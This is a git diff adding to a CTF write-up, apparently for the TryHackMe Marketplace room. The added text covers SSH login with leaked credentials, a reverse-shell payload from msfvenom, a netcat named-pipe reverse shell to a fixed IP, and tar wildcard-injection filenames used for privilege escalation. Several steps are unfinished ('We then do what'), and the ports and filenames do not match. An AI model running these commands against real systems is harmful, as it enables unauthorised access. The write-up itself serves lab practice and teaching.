@@ -2,7 +2,7 @@
 title: Marketplace CTF Write Up (2023)
 date: 2023-10-20
 categories: [CTF Write Up, THM]
-tags: [xss, idor, cookies, sqli, sudo, wildcard-injection, container-escape]
+tags: [xss, idor, cookies, sqli, sudo, wildcard-injection, container-escape, tar]
 img_path: /assets/marketplace/
 mermaid: true
 ---
@@ -125,7 +125,7 @@ Now that we know that the site is **vulnerable to XSS**, we can take advantage o
 The plan is as follows:
 1. Open a **python http server**:
 
-    ```shell
+    ```bash
     python -m http.server 12345
     ```
 
@@ -250,10 +250,89 @@ We can now try a **Union-Based SQLi** by using the `UNION` clause to extract the
 
     ![sqli-9](sqli-9.png)
 
-There is a message revealing a new password 🔒! We know that this password belongs to user `jake`, as the fourth value corresponds to the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
+There is a message revealing a new **SSH** password 🔒! We know that this password belongs to user `jake`, as the fourth value corresponds to the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
 
 ### 3.3 Sudo & Wildcard Injection
 
+We now have some **SSH credentials** and our goal is to find `user.txt`. Let's keep things simple and start by connecting to the SSH server:
+
+```bash
+# logging in as user "jake" on the default SSH port
+ssh jake@TARGET_IP
+```
+Once we are logged in, let's just search for the file:
+
+```bash
+# search for the file "user.txt" starting from the root, "/", directory
+find / -name user.txt -type f 2>/dev/null
+```
+
+Lo and behold, the second 🚩 is just there waiting us!
+
+![flag2](second-flag.jpg)
+
+Let's check if user `jake` have any SUDO privileges:
+
+![sudo-l][sudo-list.png]
+
+It seems that `jake`, can run the `/opt/backups/backup.sh` file with the perimissions of user `michael`, who is its owner. Upon closer inspection of the file's contents, we can see that this executable is vulnerable to **wildcard injection**. 
+
+Feel free to read this amazing [*Exploiting Wildcard for Privilege Escalation*](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) article to fully grasp the concept of the **wildcard injection**.
+
+This is what `backup.sh` does:
+1. It creates a **tar archive** named `backup.tar`, using the `tar cf /opt/backups/backup.tar` command.
+2. Instead of archiving a specified file, for instance, `tar cf /opt/backups/backup.tar backup.sh`, it uses the wildcard character, `*`, which means that it is archiving all files within the directory.
+
+1. We can generate a payload with `msfvenom` on our machine:
+
+    ```bash
+    msfvenom -p cmd/unix/reverse_netcat LHOST=ATTACKER-IP LPORT=54321 R
+    ```
+    Copy the generated payload.
+
+    ![msfvenom-payload](msfvenom-payload.jpg)
+
+2. Setup a listener on our local machine:
+
+    ```bash
+    nc -lvnp 54321
+    ```
+
+3. We then jump onto SSH, and create a file (`shell.ph`), containing our payload:
+
+    ```bash
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f" > shell.sh
+    ```
+
+4. We then do what
+
+    ```bash
+    echo "" > "--checkpoint-action=exec=sh shell.sh"
+    ```
+
+5. We then do what
+
+    ```bash
+    echo "" > --checkpoint=1
+    ```
+
+6. Modify permissions so 
+    ```bash
+    chmod 777 backup.tar shell.sh
+    ```
+
+7. Run `backup.sh` as user `michael`
+    ```bash
+    sudo -u michael /opt/backups/backup.sh
+    ```
+
+![michael-shell](michael-shell.png)
+
+
 ### 3.4 Container Escape
+
+Create a new container from image `alpine`, mount the root filesystem to `/mnt`, start the container in interactive mode which will give us a shell to work with, change the root to `/mnt` and delete the container upon exiting:
+
+![flag-3](flag-3.jpg)
 
  🍻🥂🚩🎊🎉
